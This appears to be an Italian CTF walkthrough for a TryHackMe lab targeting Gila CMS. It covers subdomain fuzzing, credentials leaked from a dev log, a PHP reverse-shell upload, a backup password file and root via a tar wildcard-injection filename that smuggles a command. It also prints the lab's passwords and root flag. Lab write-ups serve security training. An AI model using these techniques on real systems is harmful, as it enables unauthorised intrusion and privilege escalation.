@@ -1,0 +1,154 @@
+
+scaricato con git il sorgente del CMS
+
+cercato la stringa "version"
+
+root@kali:/opt/TryHackMe/cmess/gila# grep -ril version  *
+.
+..
+..
+src/core/package.json
+
+
+
+la versione è 1.10.9
+
+
+# sembra che questa strada sia percorribile...
+
+root@kali:~# searchsploit gila
+-------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                              |  Path
+-------------------------------------------------------------------------------------------- ---------------------------------
+Gila CMS 1.11.8 - 'query' SQL Injection                                                     | php/webapps/48590.py
+Gila CMS 1.9.1 - Cross-Site Scripting                                                       | php/webapps/46557.txt
+Gila CMS < 1.11.1 - Local File Inclusion                                                    | multiple/webapps/47407.txt
+
+
+.. non funziona un cazzo.
+usiamo wfuzz:
+
+# wfuzz -c -f sub-fighter -w subdomains-top1million-5000.txt -u 'http://cmess.thm' -H "HOST: FUZZ.cmess.thm"
+
+la maggior parte delle richieste avrà un numero costante di "words" (ad es. page not found, per un totale di 290 words), per cui vogliamo cercare tutto ciò che NON restituisce 290 words:
+
+# wfuzz -c -f sub-fighter -w subdomains-top1million-5000.txt -u 'http://cmess.thm' -H "HOST: FUZZ.cmess.thm" --hw 290
+
+si trova questo:
+
+Target: http://cmess.thm/
+Total requests: 4997
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000019:   200        30 L     104 W      934 Ch      "dev - dev"
+
+
+si trova questa pagina:
+
+Development Log
+andre@cmess.thm
+
+Have you guys fixed the bug that was found on live?
+support@cmess.thm
+
+Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
+support@cmess.thm
+
+Update! We have had to delay the patch due to unforeseen circumstances
+andre@cmess.thm
+
+That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
+support@cmess.thm
+
+Your password has been reset. Here: KPFTN_f2yxe%
+
+
+si puo' accedere dunque sul CMS con:
+
+user: andre@cmess.thm
+pass: KPFTN_f2yxe%
+
+
+# dal cms si crea un file (es. File.php) con dentro una reverse shell, poi la si richiama via web
+
+http://cmess.thm/assets/File.php
+
+
+
+scaricarsi LinEnum.sh
+
+
+si trova questo:
+
+
+[-] Location and Permissions (if accessible) of .bak file(s):
+-rw-r--r-- 1 root root 3020 Feb  6  2020 /etc/apt/sources.bak
+-rwxrwxrwx 1 root root 36 Feb  6  2020 /opt/.password.bak
+
+
+[-] Any interesting mail in /var/mail:
+total 8
+drwxrwsr-x  2 root mail 4096 Feb 26  2019 .
+drwxr-xr-x 12 root root 4096 Feb  6  2020 ..
+
+
+[-] Anything juicy in the Dockerfile:
+-rwxrwxrwx 1 root root 639 Jul 10  2019 /var/www/html/Dockerfile
+
+
+### SCAN COMPLETE ####################################
+www-data@cmess:/tmp$ cat /opt/.password.bak
+cat /opt/.password.bak
+andres backup password
+UQfsdCB7aAP6
+
+
+====================
+
+con quella pass si puo' accedere in ssh..
+
+root@kali:/opt/TryHackMe/cmess# ssh andre@cmess.thm
+The authenticity of host 'cmess.thm (10.10.201.188)' can't be established.
+ECDSA key fingerprint is SHA256:sWfTNeZtMkhHDii33U60/cvVhAonkgxNTMtJ+KYQ7bI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'cmess.thm' (ECDSA) to the list of known hosts.
+andre@cmess.thm's password:
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Last login: Thu Feb 13 15:02:43 2020 from 10.0.0.20
+andre@cmess:~$
+
+
+==========
+pigliarsi l'user flag
+
+
+===========
+
+
+andre@cmess:~/backup$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
+andre@cmess:~/backup$ chmod +x runme.sh
+andre@cmess:~/backup$ touch /home/andre/backup/--checkpoint=1
+andre@cmess:~/backup$ touch "/home/andre/backup/--checkpoint-action=exec=sh runme.sh"
+
+
+andre@cmess:/tmp$ ls -l
+total 1080
+-rw-r--r-- 1 root     root         228 Dec 25 09:22 andre_backup.tar.gz
+-rwsr-sr-x 1 root     root     1037528 Dec 25 09:22 bash
+-rwxrwxrwx 1 www-data www-data   46631 Dec 25 08:58 LinEnum.sh
+-rwxr-x--- 1 www-data www-data      51 Feb  9  2020 note
+drwx------ 3 root     root        4096 Dec 25 07:58 systemd-private-9f9e28bcc6f14bf890d0fa1b72afec7f-systemd-timesyncd.service-6lt1r3
+drwxrwxrwt 2 root     root        4096 Dec 25 07:58 VMwareDnD
+andre@cmess:/tmp$ ./bash -p
+bash-4.3# id
+uid=1000(andre) gid=1000(andre) euid=0(root) egid=0(root) groups=0(root),1000(andre)
+bash-4.3# cat /root/root.txt
+thm{9f85b7fdeb2cf96985bf5761a93546a2}
+
